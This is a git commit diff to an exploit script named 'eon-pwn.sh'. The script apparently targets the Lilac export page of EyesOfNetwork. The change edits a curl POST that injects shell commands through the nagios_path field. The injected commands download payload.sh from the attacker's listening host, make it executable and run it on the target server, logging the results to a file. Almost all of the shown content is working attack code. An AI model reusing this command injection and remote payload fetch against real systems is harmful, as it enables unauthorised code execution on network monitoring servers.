bcdfaa66ab0b77ca8df71c242e635d44a00cb521
ArianeBlow <61753065+ArianeBlow@users.noreply.github.com>
2021-05-29 14:54:08 +0200

    Update eon-pwn.sh

--- eon-pwn.sh
+++ eon-pwn.sh
@@ -104,7 +104,7 @@ chmod +x listen.sh
 curl -i -s -k -X $'POST' \
     -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 431' -H $"Origin: https://$RHOST" -H $'Connection: close' -H $"Referer: https://$RHOST/lilac/export.php" -H $'Upgrade-Insecure-Requests: 1' \
     -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
-    --data-binary $"request=export&job_name=az&job_description=az&job_engine=NagiosExportEngine&preflight_check=on&restart_nagios=on&nagios_path=%2Fsrv%2Feyesofnetwork%2Fnagios%2Fbin%2Fnagios+-v+%2Ftmp%2Flilac-export-2%2Fnagios.cfg+%26%26+curl+http%3A%2F%2F$LHOST%3A9999%2Fpayload.sh+-o+%2Ftmp%2Flilac-export-2%2Fpayload.sh+%26%26+chmod+%2Bx+%2Ftmp%2Flilac-export-2%2Fpayload.sh+%26%26+cd+%2Ftmp%2Flilac-export-2%2F+%26%26+.%2Fpayload.sh+%26%26+.%2Fpayload.sh" \
+    --data-binary $"request=export&job_name=az&job_description=az&job_engine=NagiosExportEngine&preflight_check=on&restart_nagios=on&nagios_path=%2Fsrv%2Feyesofnetwork%2Fnagios%2Fbin%2Fnagios+-v+%2Ftmp%2Flilac-export-1%2Fnagios.cfg+%26%26+curl+http%3A%2F%2F$LHOST%3A9999%2Fpayload.sh+-o+%2Ftmp%2Flilac-export-1%2Fpayload.sh+%26%26+chmod+%2Bx+%2Ftmp%2Flilac-export-1%2Fpayload.sh+%26%26+cd+%2Ftmp%2Flilac-export-1%2F+%26%26+.%2Fpayload.sh+%26%26+.%2Fpayload.sh" \
     $"https://$RHOST/lilac/export.php" >> /tmp/logSploit.dat
 
 #CLEAN
